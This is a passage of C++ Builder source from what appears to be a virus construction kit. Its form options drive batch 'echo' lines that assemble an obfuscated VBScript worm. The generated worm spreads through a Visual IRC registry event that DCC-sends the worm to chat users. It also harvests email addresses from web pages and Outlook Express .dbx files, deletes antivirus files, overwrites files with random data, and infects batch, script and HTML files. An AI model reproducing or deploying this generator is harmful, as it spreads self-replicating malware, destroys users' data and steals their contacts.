            if (Form15->ComboBox19->Text == ".xls") virf = "%"+CaseRand("tmp")+"%\\" + emis + "."+tfre;
            wstf("copy "+virf+" "+istd+"\\" + visn + ffos);
            wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKEY_USERS\\.Default\\"+CaseRand("Software\\MeGaLiTh Software\\Visual IRC 98\\Events\\Event")+"17\",\"dcc send $nick "+istd+"\\" + visn +"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        if ((Form15->CheckBox61->Checked == true && Form15->CheckBox88->Checked == true) || Form15->CheckBox93->Checked == true || Form15->CheckBox44->Checked == true || Form15->RadioButton13->Checked == true || Form15->RadioButton14->Checked == true || Form15->RadioButton12->Checked == true)
        { // start all files                   
            if (Form15->CheckBox61->Checked == true && (Form15->CheckBox88->Checked == true || Form15->CheckBox94->Checked == true))
                wstf(CaseRand("echo")+" dim "+safb+","+safa+","+saft+","+saf1+","+safc+","+saf2+","+safv+","+safl+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" for each "+sfls+" in " + fldt + ".files>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            if (Form15->CheckBox61->Checked == true && Form15->CheckBox88->Checked == true)
            {
                wstf(CaseRand("echo")+" "+safb+"=ucase("+ sfso +".getextensionname("+sfls+".path))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" if "+safb+"=\"HTM\" or "+safb+"=\"HTML\" or "+safb+"=\"HTT\" or "+safb+"=\"TXT\" or "+safb+"=\"RTF\" or "+safb+"=\"ASP\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+CaseRand("set")+" "+saff+"=" + sfso + ".opentextfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+safa+"=split("+saff+".readall,vbcrlf)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+saff+".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" for each "+saft+" in "+safa+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+saf1+"=instr(1,"+saft+",\"mailto:\",1)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" if instr(1,"+saft+",\"mailto:\",1) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+safc+"=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+saf2+"=\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" do while not(mid("+saft+","+saf1+"+"+safc+",1)=chr(34)) and not(mid("+saft+","+saf1+"+"+safc+",1)=chr(32)) and not(mid("+saft+","+saf1+"+"+safc+",1)=chr(45))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+safc+"="+safc+"+1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+saf2+"="+saf2+"+mid("+saft+","+saf1+"+"+safc+"-1,1)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" loop>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+safv+"=left("+saf2+",len("+saf2+"))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+safl+"="+safl+"&right("+safv+",len("+safv+")-7)&vbcrlf>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            if (Form15->CheckBox61->Checked == true && Form15->CheckBox94->Checked == true)
            {                                           
                wstf(CaseRand("echo")+" "+safb+"=lcase("+ sfso +".getextensionname("+sfls+".path))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" if "+safb+"=\"dbx\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+CaseRand("set")+" "+saff+"=" + sfso + ".opentextfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+safa+""+saff+".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+saff+".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+safc+"=\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+safc+"=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" for "+saft+"=1 to len("+safa+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+saf2+"=mid("+safa+","+saft+",1)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" if "+safc+"=0 then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" if "+saf2+"=chr(60) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+safc+"=1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" else>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" if "+saf2+"=chr(62) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+safl+"="+safl+"&"+saf1+"&vbcrlf>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" else>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+saf1+"="+saf1+"&"+saf2+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            if(Form15->CheckBox93->Checked)
            {   // kill AV files
                if (Form15->Memo6->Lines->Count > 0)
                {
                    wstf(CaseRand("echo")+" "+avd1+"=lcase("+sfls+".name)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    AnsiString stt;
                    for (int n=0; n<Form15->Memo6->Lines->Count; n++)
                    {
                        if (n == 0) stt = "instr(1,"+avd1+",\""+Form15->Memo6->Lines->Strings[n]+"\") ";
                        else stt = stt + "or instr(1,"+avd1+",\""+Form15->Memo6->Lines->Strings[n]+"\") ";
                    }
                    wstf(CaseRand("echo")+" if "+ stt +"then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    wstf(CaseRand("echo")+" " + sfso + ".deletefile "+sfls+".path,1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                }
                if (Form15->Memo7->Lines->Count > 0)
                {
                    wstf(CaseRand("echo")+" "+avd1+"=lcase("+ sfso +".getextensionname("+sfls+".path))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    AnsiString sti;
                    for (int n=0; n<Form15->Memo7->Lines->Count; n++)
                    {
                        if (n == 0) sti = ""+avd1+"=\""+Form15->Memo7->Lines->Strings[n]+"\" ";
                        else sti = sti + "or "+avd1+"=\""+Form15->Memo7->Lines->Strings[n]+"\" ";
                    }
                    wstf(CaseRand("echo")+" if "+ sti +"then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    wstf(CaseRand("echo")+" " + sfso + ".deletefile "+sfls+".path,1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                }
            }
            if (Form15->RadioButton13->Checked == true || Form15->RadioButton14->Checked == true || Form15->RadioButton12->Checked == true)
            {
                wstf(CaseRand("echo")+" if "+fvai+"=\""+fvps+"\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                if (Form15->RadioButton14->Checked == true)
                    wstf(CaseRand("echo")+" " + sfso + ".deletefile "+sfls+".path,1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                if (Form15->RadioButton13->Checked == true)
                    wstf(CaseRand("echo")+" dim " +bfp1+ ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                if (Form15->RadioButton12->Checked == true || Form15->RadioButton13->Checked == true)
                    wstf(CaseRand("echo")+" "+CaseRand("set")+" " +bfp2+ "=" + sfso + ".getfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                if (Form15->RadioButton12->Checked == true)
                {
                    int bfpa = 0;
                    if (Form15->CheckBox73->Checked) bfpa = bfpa + 32;
                    if (Form15->CheckBox64->Checked) bfpa = bfpa + 1;
                    if (Form15->CheckBox65->Checked) bfpa = bfpa + 2;
                    if (Form15->CheckBox66->Checked) bfpa = bfpa + 4;
                    wstf(CaseRand("echo")+" " +bfp2+ ".attributes="+ bfpa +">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                }
                if (Form15->RadioButton13->Checked == true)
                {
                    wstf(CaseRand("echo")+" " +bfp1+ "=" +bfp2+ ".attributes>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    wstf(CaseRand("echo")+" " +bfp2+ ".attributes=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    if (Form15->CheckBox67->Checked == true)
                        wstf(CaseRand("echo")+" " + sfso + ".copyfile \""+istd+"\\" + tmpn + ".bat\","+sfls+".path,1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    else
                    {
                        wstf(CaseRand("echo")+" dim " +bfp4+ "," +bfp5+ ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" randomize>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +bfp3+ "=" + sfso + ".createtextfile("+sfls+".path,1)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        Randomize();
                        wstf(CaseRand("echo")+" for " +bfp5+ "=0 to int(rnd*"+int(random(20000)+10000)+")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +bfp4+ "=" +bfp4+ "&chr(int(rnd*256))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" next>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +bfp3+ ".write " +bfp4+ ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +bfp3+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    }
                    wstf(CaseRand("echo")+" " +bfp2+ ".attributes=" +bfp1+ ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                }
                wstf(CaseRand("echo")+" else>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            }
            if (Form15->CheckBox44->Checked == true)
            {
                wstf(CaseRand("echo")+" dim " +faf1+ ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+CaseRand("set")+" " +faf2+ "=" + sfso + ".getfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " +faf1+ "=" +faf2+ ".attributes>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" " +faf2+ ".attributes=0>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" "+faf3+"=lcase("+ sfso +".getextensionname(" +faf2+ ".path))>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstf(CaseRand("echo")+" if "+faf3+"=\"\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                if (Form15->CheckBox11->Checked || Form15->CheckBox38->Checked)
                {   // bat & cmd inf
                    wstf(CaseRand("echo")+" dim "+cib1+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    wstf(CaseRand("echo")+" elseif "+faf3+"=\"bat\" or "+faf3+"=\"cmd\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    if (Form15->RadioButton1->Checked) wstf(CaseRand("echo")+" " + sfso + ".copyfile \""+istd+"\\" + tmpn + ".bat\","+sfls+".path,1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    if (Form15->RadioButton2->Checked)
                    {
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" "+fafB+"=" + sfso + ".opentextfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+cib1+"="+fafB+".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" if not(instr(1,"+cib1+",\""+fffr+"\")) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" "+fafB+"=" + sfso + ".opentextfile("+sfls+".path,8)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fvw2 + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    }
                    if (Form15->RadioButton5->Checked)       
                    {
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+fafX+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" if not(instr(1,"+fafX+",\""+fffr+"\")) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path,2)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fvw2 + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fafX + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    }
                }
                if (Form15->CheckBox12->Checked || Form15->CheckBox25->Checked)
                {   // vbs & vbe inf
                    wstf(CaseRand("echo")+" elseif "+faf3+"=\"vbs\" or "+faf3+"=\"vbe\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    if (Form15->RadioButton1->Checked) wstf(CaseRand("echo")+" " + sfso + ".copyfile \""+istd+"\\" + istv + ".vbs\","+sfls+".path,1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    if (Form15->RadioButton2->Checked)
                    {

                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+cib1+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile(\""+istd+"\\" + istv + ".vbs\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+fafX+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" if not(instr(1,"+cib1+","+fafX+")) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path,8)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fafX + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);

                    }
                    if (Form15->RadioButton5->Checked)
                    {
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile(\""+istd+"\\" + istv + ".vbs\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+fafY+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+fafX+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" if not(instr(1,"+fafX+","+fafY+")) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path,2)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fafY + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fafX + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    }
                }
                if (Form15->CheckBox19->Checked || Form15->CheckBox26->Checked)
                {   // js & jse inf
                    wstf(CaseRand("echo")+" elseif "+faf3+"=\"js\" or "+faf3+"=\"jse\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    if (Form15->RadioButton1->Checked) wstf(CaseRand("echo")+" " + sfso + ".copyfile \""+istd+"\\" + istj + ".js\","+sfls+".path,1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    if (Form15->RadioButton2->Checked)
                    {
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+cib1+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile(\""+istd+"\\" + istj + ".js\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+fafX+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" if not(instr(1,"+cib1+",\""+fffr+"\")) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path,8)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fafX + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    }
                    if (Form15->RadioButton5->Checked)     
                    {
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile(\""+istd+"\\" + istj + ".js\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+fafY+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+fafX+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" if not(instr(1,"+fafX+",\""+fffr+"\")) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path,2)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fafY + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fafX + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    }
                }
                if (Form15->CheckBox36->Checked || Form15->CheckBox51->Checked || Form15->CheckBox52->Checked || Form15->CheckBox58->Checked)
                {   // htm, html, asp & cgi inf
                    wstf(CaseRand("echo")+" elseif "+faf3+"=\"htm\" or "+faf3+"=\"html\" or "+faf3+"=\"asp\" or "+faf3+"=\"cgi\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    if (Form15->RadioButton1->Checked) wstf(CaseRand("echo")+" " + sfso + ".copyfile \"%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre+"\","+sfls+".path,1>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    if (Form15->RadioButton2->Checked)
                    {
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+fafY+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile(\"%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+fafX+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" if not(instr(1,"+fafY+","+fafX+")) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path,8)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fafX + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                    }
                    if (Form15->RadioButton5->Checked)
                    {
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile(\"%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre+"\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+fafY+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+fafX+"=" +fafB+ ".readall>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".close>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" if not(instr(1,"+fafX+","+fafY+")) then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" "+CaseRand("set")+" " +fafB+ "=" + sfso + ".opentextfile("+sfls+".path,2)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                        wstf(CaseRand("echo")+" " +fafB+ ".write " + fafY + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
